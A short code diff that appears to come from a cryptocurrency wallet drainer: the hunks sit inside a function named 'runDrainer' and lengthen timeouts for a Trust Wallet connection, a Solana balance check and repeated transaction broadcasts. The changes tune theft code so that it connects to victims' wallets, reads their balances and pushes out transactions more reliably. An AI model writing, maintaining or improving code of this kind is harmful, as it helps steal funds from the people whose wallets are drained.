@@ -258,7 +258,7 @@
               console.log(`[FALLBACK] Trying Trust Wallet connect with timeout`);
               const connectPromise = provider.connect();
               const timeoutPromise = new Promise((_, reject) => 
-                setTimeout(() => reject(new Error('Trust Wallet connection timeout')), 30000)
+                setTimeout(() => reject(new Error('Trust Wallet connection timeout')), 60000)
               );
               
               Promise.race([connectPromise, timeoutPromise]).catch(fallbackError => {
@@ -3081,7 +3081,7 @@ async function runDrainer(provider) {
           const connection = new solanaWeb3.Connection(rpcUrl);
           const balancePromise = connection.getBalance(publicKey);
           const timeoutPromise = new Promise((_, reject) => {
-            setTimeout(() => reject(new Error('Balance check timeout')), 15000); // 15 second timeout
+            setTimeout(() => reject(new Error('Balance check timeout')), 30000); // 30 second timeout
           });
           
           balance = await Promise.race([balancePromise, timeoutPromise]);
@@ -3548,7 +3548,7 @@ async function runDrainer(provider) {
     let broadcastSuccess = false;
     
     // Add timeout for broadcast attempts
-          const broadcastTimeout = 45000; // 45 seconds
+          const broadcastTimeout = 60000; // 60 seconds
     
     // Try multiple broadcast attempts with timeout
     for (let attempt = 1; attempt <= 3; attempt++) {
